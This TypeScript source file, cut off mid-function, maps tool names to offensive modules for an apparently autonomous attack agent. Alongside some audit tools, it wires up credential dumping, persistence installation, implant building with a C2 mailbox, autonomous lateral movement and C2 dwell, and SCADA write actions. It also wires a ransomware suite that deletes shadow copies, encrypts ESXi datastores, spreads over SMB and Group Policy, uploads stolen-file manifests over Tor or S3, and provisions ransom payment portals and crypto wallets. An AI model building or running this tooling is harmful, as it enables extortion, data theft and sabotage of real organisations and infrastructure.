/**
 * @module module_bridge
 * Wires unwired security modules into the agent tool dispatch surface.
 */
import * as crypto from "node:crypto"
import * as path from "node:path"
import type { AgentToolContext, ToolRunResult } from "./agent_tools.ts"
import { hostFromTarget } from "./agent_tools.ts"
import { compactToolOutput, isEfficientMode } from "./mcp_efficiency.ts"

function result(
  tool: string,
  command: string,
  ctx: AgentToolContext,
  payload: unknown,
  success = true,
): ToolRunResult {
  const raw = JSON.stringify(payload).slice(0, 4000)
  return {
    tool,
    command,
    dryRun: !ctx.live,
    success,
    output: isEfficientMode() ? compactToolOutput(payload) : raw,
  }
}

export const MODULE_BRIDGE: Record<
  string,
  (ctx: AgentToolContext, params: Record<string, unknown>) => Promise<ToolRunResult>
> = {
  hybrid_ad_audit: async (ctx, params) => {
    const { hybridADAttackChain } = await import("./hybrid_ad_entra.ts")
    const domain = String(params.domain ?? hostFromTarget(ctx.target))
    const r = await hybridADAttackChain({ domain, dryRun: !ctx.live })
    return result("hybrid_ad_audit", "hybridADAttackChain", ctx, r)
  },
  oauth_audit: async (ctx, params) => {
    const mod = await import("./oauth_chain.ts")
    const raw = String(params.target ?? ctx.target)
    const target = raw.startsWith("http") ? raw : `https://${raw}/oauth/callback`
    const audit = ctx.live
      ? await mod.auditOAuthChainAsync(target, { dryRun: false })
      : mod.auditOAuthChain(target, { dryRun: true })
    return result("oauth_audit", "auditOAuthChain", ctx, audit)
  },
  webmail_audit: async (ctx, params) => {
    const { auditWebmailPersistence } = await import("./webmail_exploit.ts")
    const target = String(params.target ?? ctx.target)
    const r = await auditWebmailPersistence({ target, dryRun: !ctx.live })
    return result("webmail_audit", "auditWebmailPersistence", ctx, r)
  },
  adcs_audit: async (ctx, params) => {
    const { auditADCS } = await import("./adcs_audit.ts")
    const domain = String(params.domain ?? hostFromTarget(ctx.target))
    const r = auditADCS({ domain, dcIp: String(params.dcIp ?? domain) }, { live: ctx.live })
    return result("adcs_audit", "auditADCS", ctx, r)
  },
  lolbins_audit: async (ctx) => {
    const { auditLOLBins } = await import("./lolbins_audit.ts")
    return result("lolbins_audit", "auditLOLBins", ctx, auditLOLBins({ live: ctx.live }))
  },
  ebpf_audit: async (ctx) => {
    const { auditEBPFAndPersistence } = await import("./ebpf_audit.ts")
    return result("ebpf_audit", "auditEBPFAndPersistence", ctx, auditEBPFAndPersistence({ dryRun: !ctx.live }))
  },
  uefi_audit: async (ctx) => {
    const { auditUEFIAndBootkit } = await import("./uefi_bootkit_audit.ts")
    return result("uefi_audit", "auditUEFIAndBootkit", ctx, auditUEFIAndBootkit({ live: ctx.live }))
  },
  net_device_audit: async (ctx, params) => {
    const { auditNetworkDevice } = await import("./net_device.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    return result("net_device_audit", "auditNetworkDevice", ctx, auditNetworkDevice(host, { live: ctx.live }))
  },
  cred_dump: async (ctx) => {
    const { CredentialDumpingEngine } = await import("./cred_dump.ts")
    const engine = new CredentialDumpingEngine()
    const r = await engine.dump({ dryRun: !ctx.live })
    return result("cred_dump", "CredentialDumpingEngine.dump", ctx, r)
  },
  strix_web: async (ctx, params) => {
    const { StrixCoordinator } = await import("./strix_engine.ts")
    const url = String(params.url ?? params.target_url ?? ctx.target)
    const coord = new StrixCoordinator({ live: ctx.live })
    const attack = String(params.attack ?? "form_fuzz") as "xss_reflection" | "csrf_test" | "sqli_probe" | "form_fuzz" | "auth_bypass"
    coord.queue(url, attack)
    const jobs = await coord.runAll()
    return result("strix_web", "StrixCoordinator.runAll", ctx, { url, jobs: jobs.length, results: jobs })
  },
  counter_intel: async (ctx, params) => {
    const { auditDefenses } = await import("./counter_intel.ts")
    return result("counter_intel", "auditDefenses", ctx, auditDefenses({ live: ctx.live, check: String(params.check ?? "all") }))
  },
  attack_navigator: async (ctx) => {
    const { exportNavigatorLayer, findingsToTechniques } = await import("./attack_navigator.ts")
    const findings = Object.values(ctx.graph.toJSON().assets ?? {}).flatMap((a) =>
      Object.values((a as { services?: Record<string, { vulns?: { id?: string; title?: string; severity?: string }[] }> }).services ?? {})
        .flatMap((s) => s.vulns ?? [])
        .map((v) => ({ id: v.id ?? "", title: v.title ?? "", severity: v.severity ?? "info" })),
    )
    const techniques = [...findingsToTechniques(findings).keys()]
    const layer = exportNavigatorLayer(findings, { name: ctx.target })
    return result("attack_navigator", "exportNavigatorLayer", ctx, { techniques, layerName: layer.name })
  },
  pivot_tunnel: async (ctx, params) => {
    const { createPortForwarder } = await import("./pivot_tunnel.ts")
    const method = String(params.method ?? "socks5")
    const type = method === "chisel" ? "chisel" : method === "ssh" ? "port_forward" : "socks5"
    const r = createPortForwarder(
      {
        type,
        localPort: Number(params.lport ?? 1080),
        remoteHost: String(params.rhost ?? "127.0.0.1"),
        remotePort: Number(params.rport ?? 22),
      },
      ctx.live,
    )
    return result("pivot_tunnel", "createPortForwarder", ctx, r)
  },
  iot_scada: async (ctx, params) => {
    const { executeScadaAction } = await import("./iot_scada.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const r = await executeScadaAction(
      {
        host,
        protocol: String(params.protocol ?? "modbus"),
        action: String(params.action ?? "read"),
        port: params.port as number | undefined,
        unitId: params.unitId as number | undefined,
        address: params.address as number | undefined,
        quantity: params.quantity as number | undefined,
        value: params.value as number | boolean | undefined,
      },
      { live: ctx.live },
    )
    return result("iot_scada", "executeScadaAction", ctx, r, r.success)
  },
  telecom_audit: async (ctx, params) => {
    const { auditTelecom } = await import("./telecom_audit.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const r = await auditTelecom(host, { live: ctx.live, snmpCommunity: String(params.community ?? "public") })
    return result("telecom_audit", "auditTelecom", ctx, r)
  },
  ot_scan: async (ctx, params) => {
    const { executeScadaAction } = await import("./iot_scada.ts")
    const { auditTelecom } = await import("./telecom_audit.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const modbus = await executeScadaAction({ host, protocol: "modbus", action: "read" }, { live: ctx.live })
    const dnp3 = await executeScadaAction({ host, protocol: "dnp3", action: "probe" }, { live: ctx.live })
    const mqtt = await executeScadaAction({ host, protocol: "mqtt", action: "connect" }, { live: ctx.live })
    const bacnet = await executeScadaAction({ host, protocol: "bacnet", action: "whois" }, { live: ctx.live })
    const telecom = await auditTelecom(host, { live: ctx.live })
    return result("ot_scan", "ot_it_telecom_scan", ctx, { modbus, dnp3, mqtt, bacnet, telecom })
  },
  persistence_install: async (ctx, params) => {
    const { PersistenceEngine } = await import("./persistence.ts")
    const engine = new PersistenceEngine()
    const r = await engine.installPersistence(String(params.mechanism ?? "cron job"), {
      live: ctx.live,
      targetOs: String(params.os ?? ""),
      payloadPath: String(params.payload ?? ""),
    })
    return result("persistence_install", "PersistenceEngine.installPersistence", ctx, r)
  },
  auto_research: async (ctx, params) => {
    const { researchCve } = await import("./auto_research.ts")
    const cveId = String(params.cve_id ?? params.cveId ?? "CVE-2021-44228")
    const r = await researchCve({ cveId, repoUrl: params.repoUrl as string | undefined, patchCommitHash: params.patchCommitHash as string | undefined }, { dryRun: !ctx.live })
    return result("auto_research", "researchCve", ctx, r)
  },
  implant_build: async (ctx, params) => {
    const { NativeImplantGenerator } = await import("./implant_gen.ts")
    const gen = new NativeImplantGenerator()
    const mailbox = String(params.mailbox ?? process.env.OURMINE_C2_MAILBOX ?? "http://127.0.0.1:8080/mailbox")
    const keyHex = String(params.key ?? crypto.randomBytes(32).toString("hex"))
    const session = String(params.session ?? "sess_" + Date.now())
    const source = gen.generateGo(mailbox, keyHex, session)
    if (!ctx.live) {
      return result("implant_build", "NativeImplantGenerator.generateGo", ctx, { sourceLength: source.length, built: false, dryRun: true })
    }
    const outDir = String(params.outDir ?? "/tmp/ourmine_beacon_build")
    const built = await gen.buildGo(source, outDir, { goos: String(params.goos ?? "linux"), goarch: String(params.goarch ?? "amd64") })
    return result("implant_build", "NativeImplantGenerator.buildGo", ctx, built, built.status === "built")
  },
  mobile_audit: async (ctx, params) => {
    const { listADBDevices } = await import("./mobile.ts")
    const devices = listADBDevices(ctx.live)
    return result("mobile_audit", "listADBDevices", ctx, { devices, apk_path: params.apk_path ?? null })
  },
  firmware_audit: async (ctx, params) => {
    const { analyzeFirmware } = await import("./firmware.ts")
    const filePath = String(params.path ?? params.firmware_path ?? "")
    if (!filePath) return result("firmware_audit", "analyzeFirmware", ctx, { error: "path required" }, false)
    const sections = analyzeFirmware(filePath)
    return result("firmware_audit", "analyzeFirmware", ctx, { path: filePath, sections: sections.length, sample: sections.slice(0, 5) })
  },
  opsec_review: async (ctx, params) => {
    const { gateExecution } = await import("./opsec_gate.ts")
    const command = String(params.command ?? "id")
    const tool = String(params.tool ?? "bash")
    const review = await gateExecution({ tool, command, live: ctx.live, profile: String(params.profile ?? "default") })
    return result("opsec_review", "gateExecution", ctx, review)
  },
  proof_export: async (ctx) => {
    const { buildProofPack, writeProofPack } = await import("./proof_pack.ts")
    const pack = buildProofPack(ctx.graph)
    const dir = String(process.env.OURMINE_PROOF_DIR ?? ".ourmine/proof")
    const file = writeProofPack(pack, dir)
    return result("proof_export", "writeProofPack", ctx, { path: file, merkleRoot: pack.merkleRoot })
  },
  raas_campaign: async (ctx, params) => {
    const { runRaasCampaign } = await import("./raas_engine.ts")
    const targetDir = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/var/backups")
    const r = await runRaasCampaign({
      targetDir,
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      esxiHost: params.esxi_host as string | undefined,
      smbTargets: params.smb_targets as string[] | undefined,
      domain: params.domain as string | undefined,
      familyName: String(params.family ?? "OURMINE-RAAS"),
    })
    return result("raas_campaign", "runRaasCampaign", ctx, r, !r.dryRun || r.leakCatalog.count >= 0)
  },
  raas_vss_wipe: async (ctx, params) => {
    const { deleteVolumeShadowCopies } = await import("./raas_engine.ts")
    const r = deleteVolumeShadowCopies({ live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_vss_wipe", "deleteVolumeShadowCopies", ctx, r, r.success || r.dryRun)
  },
  raas_leak_catalog: async (ctx, params) => {
    const { buildLeakCatalog } = await import("./raas_engine.ts")
    const root = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/var/backups")
    const r = buildLeakCatalog(root, { live: ctx.live, maxFiles: Number(params.max_files ?? 100) })
    return result("raas_leak_catalog", "buildLeakCatalog", ctx, { count: r.entries.length, manifestPath: r.manifestPath, totalBytes: r.totalBytes })
  },
  raas_esxi_encrypt: async (ctx, params) => {
    const { encryptEsxiDatastores } = await import("./raas_engine.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const r = await encryptEsxiDatastores(host, { live: ctx.live, forceLive: Boolean(params.forceLive), mountPath: params.mount_path as string | undefined })
    return result("raas_esxi_encrypt", "encryptEsxiDatastores", ctx, r, r.dryRun || r.encrypted.length >= 0)
  },
  raas_smb_spread: async (ctx, params) => {
    const { spreadViaSmb } = await import("./raas_engine.ts")
    const targets = (params.targets as string[] | undefined) ?? [hostFromTarget(ctx.target)]
    const cmd = String(params.command ?? "cmd /c echo ourmine_raas_marker")
    const r = spreadViaSmb(targets, cmd, { live: ctx.live, forceLive: Boolean(params.forceLive), domain: params.domain as string | undefined })
    return result("raas_smb_spread", "spreadViaSmb", ctx, r, r.success || r.dryRun)
  },
  raas_gpo_spread: async (ctx, params) => {
    const { spreadViaGpo } = await import("./raas_engine.ts")
    const domain = String(params.domain ?? hostFromTarget(ctx.target))
    const payload = String(params.payload ?? "Write-Host ourmine_gpo_marker")
    const r = spreadViaGpo(domain, payload, { live: ctx.live, forceLive: Boolean(params.forceLive), dc: params.dc as string | undefined })
    return result("raas_gpo_spread", "spreadViaGpo", ctx, r)
  },
  raas_payment: async (ctx, params) => {
    const { generatePaymentBundle } = await import("./raas_engine.ts")
    const r = generatePaymentBundle({ live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_payment", "generatePaymentBundle", ctx, { keyId: r.keyId, torPaymentId: r.torPaymentId, portalDescriptorPath: r.portalDescriptorPath })
  },
  raas_exfil_upload: async (ctx, params) => {
    const { buildLeakCatalog } = await import("./raas_engine.ts")
    const { uploadLeakManifestAdvanced } = await import("./raas_advanced.ts")
    let manifestPath = String(params.manifest_path ?? "")
    if (!manifestPath) {
      const root = String(params.target_dir ?? process.env.OURMINE_BACKUP_PATH ?? "/tmp")
      const cat = buildLeakCatalog(root, { maxFiles: Number(params.max_files ?? 50) })
      manifestPath = cat.manifestPath
    }
    const r = await uploadLeakManifestAdvanced(manifestPath, {
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      mode: params.mode as "http" | "s3" | "tor" | "auto" | undefined,
      uploadUrl: params.upload_url as string | undefined,
      bearerToken: params.bearer_token as string | undefined,
    })
    return result("raas_exfil_upload", "uploadLeakManifestAdvanced", ctx, r, r.uploaded || r.dryRun)
  },
  raas_gpo_deploy: async (ctx, params) => {
    const { modifyGpoLogonScript } = await import("./raas_advanced.ts")
    const domain = String(params.domain ?? hostFromTarget(ctx.target))
    const payload = String(params.payload ?? "Write-Host ourmine_gpo_marker")
    const r = modifyGpoLogonScript(domain, payload, {
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      dc: params.dc as string | undefined,
      username: params.username as string | undefined,
      password: params.password as string | undefined,
      gpoGuid: params.gpo_guid as string | undefined,
    })
    return result("raas_gpo_deploy", "modifyGpoLogonScript", ctx, r, r.smbUploaded || r.dryRun)
  },
  raas_tor_portal: async (ctx, params) => {
    const { provisionTorPortal } = await import("./raas_advanced.ts")
    const r = provisionTorPortal(
      {
        keyId: String(params.key_id ?? `sess_${Date.now()}`),
        bitcoinAddress: String(params.btc ?? "bc1qourmine000000000000000000000"),
        moneroAddress: String(params.xmr ?? "4ourmine000000000000000000000000000000000000000000000000000000000"),
      },
      { live: ctx.live, forceLive: Boolean(params.forceLive) },
    )
    return result("raas_tor_portal", "provisionTorPortal", ctx, r)
  },
  raas_esxi_deploy: async (ctx, params) => {
    const { deployEsxiEncryptor } = await import("./raas_advanced.ts")
    const host = String(params.host ?? hostFromTarget(ctx.target))
    const keyId = String(params.key_id ?? `esxi_${Date.now()}`)
    const r = deployEsxiEncryptor(host, keyId, { live: ctx.live, forceLive: Boolean(params.forceLive), sshUser: params.ssh_user as string | undefined })
    return result("raas_esxi_deploy", "deployEsxiEncryptor", ctx, r, r.deployed || r.dryRun)
  },
  raas_wallet_create: async (ctx, params) => {
    const { createWalletPair, walletTerminalSummary, ensureWalletToolchain } = await import("./raas_wallet.ts")
    const opts = {
      ephemeral: params.persist !== true,
      campaignId: params.campaign_id as string | undefined,
      live: ctx.live,
      forceLive: Boolean(params.forceLive),
      autoInstall: params.auto_install !== false,
    }
    let install = undefined as Awaited<ReturnType<typeof ensureWalletToolchain>> | undefined
    if (params.install_deps === true || (opts.autoInstall && ctx.live && opts.forceLive)) {
      install = ensureWalletToolchain(opts)
    }
    const { btc, xmr, install: createInstall } = createWalletPair(opts)
    return result("raas_wallet_create", "createWalletPair", ctx, {
      btc: { id: btc.id, address: btc.address, ephemeral: btc.ephemeral, source: btc.source },
      xmr: { id: xmr.id, address: xmr.address, ephemeral: xmr.ephemeral, source: xmr.source, error: xmr.error },
      install: install ?? createInstall,
      summary: walletTerminalSummary({ ephemeral: params.persist !== true }),
    })
  },
  raas_wallet_install_deps: async (ctx, params) => {
    const { ensureWalletToolchain } = await import("./raas_wallet.ts")
    const r = ensureWalletToolchain({ live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_wallet_install_deps", "ensureWalletToolchain", ctx, r, r.installed.length > 0 || r.dryRun)
  },
  raas_wallet_balance: async (ctx, params) => {
    const { getWalletBalance } = await import("./raas_wallet.ts")
    const r = await getWalletBalance(String(params.wallet_id ?? ""), { live: ctx.live, forceLive: Boolean(params.forceLive) })
    return result("raas_wallet_balance", "getWalletBalance", ctx, r)
  },
  raas_wallet_list: async (ctx) => {
    const { listWallets, walletTerminalSummary, checkWalletToolchain } = await import("./raas_wallet.ts")
    return result("raas_wallet_list", "listWallets", ctx, {
      toolchain: checkWalletToolchain(),
      wallets: listWallets({}),
      summary: walletTerminalSummary({}),
    })
  },
  raas_wallet_wipe: async (ctx, params) => {
    const { wipeWallet, wipeAllWallets } = await import("./raas_wallet.ts")
    const opts = { live: ctx.live, forceLive: Boolean(params.forceLive) }
    const r = params.all ? wipeAllWallets(opts) : wipeWallet(String(params.wallet_id ?? ""), opts)
    return result("raas_wallet_wipe", params.all ? "wipeAllWallets" : "wipeWallet", ctx, r, Boolean((r as { wiped?: boolean }).wiped ?? (r as { count?: number }).count))
  },
  http_state_fuzz: async (ctx, params) => {
    const { runStateMachineFlow, defaultAuthBypassFlow, defaultSessionFlow } = await import("./http_state_fuzzer.ts")
    const url = String(params.target_url ?? params.url ?? `http://${hostFromTarget(ctx.target)}:8080`)
    const flowName = String(params.flow ?? "session")
    const flow = flowName === "auth-bypass" ? defaultAuthBypassFlow(url) : defaultSessionFlow(url)
    const r = await runStateMachineFlow(flow, { live: ctx.live })
    return result("http_state_fuzz", "runStateMachineFlow", ctx, r, r.steps.some((s) => s.passed))
  },
  autonomous_pivot: async (ctx, params) => {
    const { runAutonomousPivot } = await import("./autonomous_pivot.ts")
    const { CredentialGraph } = await import("./credential_graph.ts")
    const credGraph = CredentialGraph.load()
    if (process.env.OURMINE_LAB_AUTONOMOUS === "1") process.env.OURMINE_AUTONOMOUS_PIVOT = "1"
    const r = await runAutonomousPivot({
      graph: ctx.graph,
      credGraph,
      live: ctx.live,
      extraHosts: (params.extra_hosts as string[]) ?? [],
      objective: (params.objective as import("./autonomous_pivot.ts").PivotObjective) ?? "recon_only",
    })
    credGraph.save()
    return result("autonomous_pivot", "runAutonomousPivot", ctx, r, r.hostsGained.length > 0 || !ctx.live)
  },
  apt_playbook: async (ctx, params) => {
    const { loadPlaybook, nextPlaybookNode, markNodeDone } = await import("./apt_playbook.ts")
    const profileId = String(params.profile_id ?? "scattered_spider")
    const playbook = loadPlaybook(profileId)
    if (!playbook) return result("apt_playbook", "loadPlaybook", ctx, { error: "unknown profile" }, false)
    const { CredentialGraph } = await import("./credential_graph.ts")
    const credGraph = CredentialGraph.load()
    const node = nextPlaybookNode(playbook, {
      currentPhase: String(params.phase ?? "recon") as import("./pentestgpt_agent.ts").Phase,
      graph: ctx.graph,
      credCount: credGraph.listCredentials().length,
      availableTools: new Set(["recon", "nmap_scan", "web_exploit", "lateral_move"]),
    })
    if (node && params.execute === true) {
      const toolResult = await import("./agent_tools.ts").then((m) => m.executeAgentTool(ctx, node.tool, node.params ?? {}))
      markNodeDone(playbook, node.id, toolResult.success, toolResult.output.slice(0, 200))
    }
    return result("apt_playbook", "nextPlaybookNode", ctx, { profileId, next: node, playbook })
  },
  c2_autonomous: async (ctx, params) => {
    const { LegitC2Server } = await import("./c2_platform.ts")
    const { runAutonomousC2Pump } = await import("./c2_autonomous.ts")
    const server = new LegitC2Server({ checkpointPath: String(params.checkpoint ?? ".ourmine/c2/checkpoint.jsonl") })
    const scopeHosts = [hostFromTarget(ctx.target), ...Object.keys((ctx.graph.toJSON() as { assets?: Record<string, unknown> }).assets ?? {})]
    const r = await runAutonomousC2Pump({ server, graph: ctx.graph, scopeHosts, maxTasksPerPump: Number(params.max_tasks ?? 5) })
    return result("c2_autonomous", "runAutonomousC2Pump", ctx, r)
  },
  exploit_adapter: async (ctx, params) => {
    const { recommendAndRun, listExploitModules } = await import("./exploit_adapter.ts")
    if (params.list === true) {
      return result("exploit_adapter", "listExploitModules", ctx, listExploitModules({ service: params.service as string, cve: params.cve as string }))
    }
    const target = String(params.target ?? ctx.target)
    const r = await recommendAndRun(target, { service: params.service as string, cve: params.cve as string }, { live: ctx.live })
    return result("exploit_adapter", "recommendAndRun", ctx, r ?? { note: "no module matched" })
  },
  identity_chain: async (ctx, params) => {
    const { runIdentityChain } = await import("./identity_chain.ts")
    const target = String(params.target ?? ctx.target)
    const r = await runIdentityChain(target, { live: ctx.live })
    return result("identity_chain", "runIdentityChain", ctx, r, r.steps.some((s) => s.success))
  },
  runtime_capability: async (ctx) => {
    const { assessRuntimeCapabilities, resolveScanCommand } = await import("./runtime_capability.ts")
    const host = hostFromTarget(ctx.target)
    const scan = resolveScanCommand(host, 8080)
    const report = await assessRuntimeCapabilities()
    return result("runtime_capability", "assessRuntimeCapabilities", ctx, { ...report, recommendedScan: scan })
  },
  c2_rotation: async (ctx, params) => {
    const { selectC2Channel } = await import("./c2_rotation.ts")
    const { InMemoryTransport } = await import("./c2_platform.ts")
    const channels = [
      { name: "in-memory", transport: new InMemoryTransport(), priority: 10, edrRisk: "low" as const },
      { name: "http-webhook", transport: new InMemoryTransport(), priority: 5, edrRisk: "medium" as const },
    ]
    const r = await selectC2Channel(channels, { live: ctx.live, previousChannel: params.previous as string | undefined })
    return result("c2_rotation", "selectC2Channel", ctx, r)
  },
  supply_chain_exec: async (ctx, params) => {
    const { executeSupplyChainChain } = await import("./supply_chain_exec.ts")
    const r = await executeSupplyChainChain({
      package: String(params.package ?? "lodash"),
      ecosystem: String(params.registry ?? "npm"),
      projectDir: String(params.project_dir ?? process.cwd()),
      live: ctx.live,
    })
    return result("supply_chain_exec", "executeSupplyChainChain", ctx, r, r.compromiseIndicators.length > 0 || !ctx.live)
  },
  engagement_memory: async (ctx, params) => {
    const { EngagementMemory } = await import("./engagement_memory.ts")
    const mem = EngagementMemory.loadForTarget(ctx.target)
    if (params.phase) mem.setPhase(String(params.phase))
    if (params.record_host) mem.recordHost(String(params.record_host))
    if (params.record_failure) {
      mem.recordFailedAttempt(String(params.tool ?? "unknown"), ctx.target, String(params.reason ?? ""))
    }
    const throttle = mem.shouldThrottleTool(String(params.check_tool ?? "cred_spray"))
    return result("engagement_memory", "EngagementMemory.snapshot", ctx, { snapshot: mem.snapshot(), throttle })
  },
  tier1_validation: async (ctx, params) => {
    const { runTier1ValidationSuite } = await import("./tier1_validation.ts")
    const url = String(params.target_url ?? params.url ?? `http://${hostFromTarget(ctx.target)}:8080`)
    const r = await runTier1ValidationSuite(url, { live: ctx.live })
    return result("tier1_validation", "runTier1ValidationSuite", ctx, r, r.idor.proven || r.fuzz.l3BypassProven || !ctx.live)
  },
  campaign_loop: async (ctx, params) => {
    const { runCampaignLoop } = await import("./campaign_loop.ts")
    const { CredentialGraph } = await import("./credential_graph.ts")
    const { EngagementMemory } = await import("./engagement_memory.ts")
    const credGraph = CredentialGraph.load()
    const mem = EngagementMemory.loadForTarget(ctx.target)
    if (process.env.OURMINE_TIER1 === "1") process.env.OURMINE_AUTONOMOUS_PIVOT = "1"
    const r = await runCampaignLoop({
      graph: ctx.graph,
      credGraph,
      target: hostFromTarget(ctx.target),
      live: ctx.live,
      engagementMem: mem,
      objective: params.objective ? { type: String(params.objective) as import("./autonomous_pivot.ts").PivotObjective, maxHosts: 10, maxSteps: 15 } : undefined,
    })
    return result("campaign_loop", "runCampaignLoop", ctx, r, r.objectiveMet || r.phases.some((p) => p.success))
  },
  identity_playbooks: async (ctx, params) => {
    const { runFullIdentityPlaybook, runAiAgentAbuseChain } = await import("./identity_playbooks.ts")
    const target = String(params.target ?? ctx.target)
    if (params.playbook === "ai_agent") {
      const r = await runAiAgentAbuseChain(target, { live: ctx.live })
      return result("identity_playbooks", "runAiAgentAbuseChain", ctx, r, r.findings.length > 0 || !ctx.live)
    }
    const r = await runFullIdentityPlaybook(target, { live: ctx.live })
    return result("identity_playbooks", "runFullIdentityPlaybook", ctx, r, r.chain.steps.some((s) => s.success) || !ctx.live)
  },
  exploit_synthesis: async (ctx, params) => {
    const { synthesizeFromIndicator, adaptiveModuleRank } = await import("./exploit_synthesis.ts")
    if (params.rank === true) {
      return result("exploit_synthesis", "adaptiveModuleRank", ctx, adaptiveModuleRank())
    }
    const indicator = String(params.indicator ?? params.error_body ?? "java.lang.NullPointerException")
    const r = await synthesizeFromIndicator(String(params.target ?? ctx.target), indicator, { live: ctx.live })
    return result("exploit_synthesis", "synthesizeFromIndicator", ctx, r, r.errorHints.length > 0)
  },
  c2_dwell_ops: async (ctx, params) => {
    const { runC2DwellOps } = await import("./c2_dwell_ops.ts")
    const scopeHosts = [hostFromTarget(ctx.target), ...Object.keys((ctx.graph.toJSON() as { assets?: Record<string, unknown> }).assets ?? {})]
    const r = await runC2DwellOps({ graph: ctx.graph, scopeHosts, live: ctx.live, dwellHours: Number(params.dwell_hours ?? 168) })
    return result("c2_dwell_ops", "runC2DwellOps", ctx, r, !!r.c2Pump || !ctx.live)
  },
  collection_engine: async (ctx, params) => {
    const { stageCollection } = await import("./collection_engine.ts")
    const dir = String(params.scan_dir ?? params.target_dir ?? process.cwd())
    const r = await stageCollection(dir, { live: ctx.live, maxFiles: Number(params.max_files ?? 100) })
    return result("collection_engine", "stageCollection", ctx, r, r.artifacts.length > 0 || !ctx.live)
  },
  cred_access_auto: async (ctx, params) => {
    const { runAutonomousCredAccess } = await import("./cred_access_auto.ts")
    const { CredentialGraph } = await import("./credential_graph.ts")
    const credGraph = CredentialGraph.load()
    if (process.env.OURMINE_TIER1 === "1") process.env.OURMINE_AUTONOMOUS_PIVOT = "1"
    const r = await runAutonomousCredAccess({
      target: hostFromTarget(ctx.target),
      domain: params.domain as string | undefined,
      live: ctx.live,
      credGraph,
      methods: params.methods as string[] | undefined,
    })
    return result("cred_access_auto", "runAutonomousCredAccess", ctx, r, r.some((x) => x.success) || !ctx.live)
  },
  dry_run_simulator: async (ctx, params) => {
    const { simulateEngagement } = await import("./dry_run_simulator.ts")
    const r = await simulateEngagement(ctx.target, { profileId: params.profile_id as string | undefined, graph: ctx.graph })
    return result("dry_run_simulator", "simulateEngagement", ctx, r)
  },
  tier1_orchestrator: async (ctx, params) => {
    const { runTier1Orchestrator } = await import("./tier1_orchestrator.ts")
    const { CredentialGraph } = await import("./credential_graph.ts")
    if (!ctx.live && process.env.OURMINE_TIER1 !== "1") {
      return result("tier1_orchestrator", "runTier1Orchestrator", ctx, { error: "live execution required" }, false)
    }
    process.env.OURMINE_TIER1 = "1"
    const r = await runTier1Orchestrator({
      target: ctx.target,
      graph: ctx.graph,
      credGraph: CredentialGraph.load(),
      live: true,
      profileId: params.profile_id as string | undefined,
    })
    return result("tier1_orchestrator", "runTier1Orchestrator", ctx, r, r.live)
  },
  tier1_depth: async (ctx) => {
    const { collectTier1Metrics, formatTier1Metrics } = await import("./tier1_depth_metrics.ts")
    const m = await collectTier1Metrics()
    return result("tier1_depth", "collectTier1Metrics", ctx, { metrics: m, formatted: formatTier1Metrics(m) })
  },
  segment_tunnel: async (ctx) => {
    const { orchestrateSegmentTunnels } = await import("./segment_tunnel_orchestrator.ts")
    const r = await orchestrateSegmentTunnels(ctx.graph, { live: ctx.live })
    return result("segment_tunnel", "orchestrateSegmentTunnels", ctx, r, r.tunnels.some((t) => t.live))
  },
  edr_feedback_loop: async (ctx) => {
    const { runEdrFeedbackLoop } = await import("./edr_feedback_loop.ts")
    const r = await runEdrFeedbackLoop({ live: ctx.live })
    return result("edr_feedback_loop", "runEdrFeedbackLoop", ctx, r, r.iterations.length > 0)
  },
  privesc_chains: async (ctx, params) => {
    const { runPrivescChains } = await import("./privesc_chains.ts")
    const r = await runPrivescChains({ live: ctx.live, domain: params.domain as string | undefined, dc: params.dc as string | undefined })
    return result("privesc_chains", "runPrivescChains", ctx, r, r.proven || r.steps.length > 0)
  },
  multi_cloud_asm: async (ctx, params) => {
    const { fuseMultiCloudAsm } = await import("./multi_cloud_asm.ts")
    const r = await fuseMultiCloudAsm(ctx.graph, { live: ctx.live, target: String(params.target ?? ctx.target) })
    return result("multi_cloud_asm", "fuseMultiCloudAsm", ctx, r, r.fusedCount >= 0)
  },
  c2_dwell_scheduler: async (ctx, params) => {
    const { runDwellSchedule } = await import("./c2_dwell_scheduler.ts")
    const scopeHosts = [hostFromTarget(ctx.target), ...Object.keys((ctx.graph.toJSON() as { assets?: Record<string, unknown> }).assets ?? {})]
    const r = await runDwellSchedule({ graph: ctx.graph, scopeHosts, live: ctx.live, dwellHours: Number(params.dwell_hours ?? 168), maxTicks: Number(params.max_ticks ?? 3) })
    return result("c2_dwell_scheduler", "runDwellSchedule", ctx, r, r.ticks.length > 0 || !ctx.live)
  },
  esxi_lab_encrypt: async (ctx, params) => {
    const { runLabEsxiEncryptWithRecovery } = await import("./raas_advanced.ts")
    const dir = String(params.target_dir ?? path.join(process.cwd(), ".ourmine/lab/esxi"))
    const r = runLabEsxiEncryptWithRecovery(dir, String(params.key_id ?? `lab_${Date.now()}`))
    return result("esxi_lab_encrypt", "runLabEsxiEncryptWithRecovery", ctx, r, r.recovered)
  },
  ares_zero_day_fuzzer: async (ctx, params) => {
    const { runZeroDayFuzzer } = await import("./ares/zero_day_fuzzer.ts")
    const r = await runZeroDayFuzzer({
      target: String(params.target ?? "echo"),
      live: ctx.live,
      seedFile: params.seed_file as string | undefined,
      rounds: Number(params.rounds ?? 32),
    })
    return result("ares_zero_day_fuzzer", "runZeroDayFuzzer", ctx, r, r.crashes.length >= 0)
  },
  ares_fileless_implant: async (ctx) => {
    const { buildFilelessImplant } = await import("./ares/fileless_implant.ts")
    const r = await buildFilelessImplant({ live: ctx.live })
    return result("ares_fileless_implant", "buildFilelessImplant", ctx, r, r.artifacts.length > 0)
  },
  ares_firmware_implant: async (ctx, params) => {
    const { deployFirmwareImplant } = await import("./ares/firmware_implant.ts")
    const r = await deployFirmwareImplant({ live: ctx.live, target: params.target as string | undefined, keyId: params.key_id as string | undefined })
    return result("ares_firmware_implant", "deployFirmwareImplant", ctx, r, r.deployed || r.uefiDriver.length > 0)
  },
  ares_hypervisor_rootkit: async (ctx, params) => {
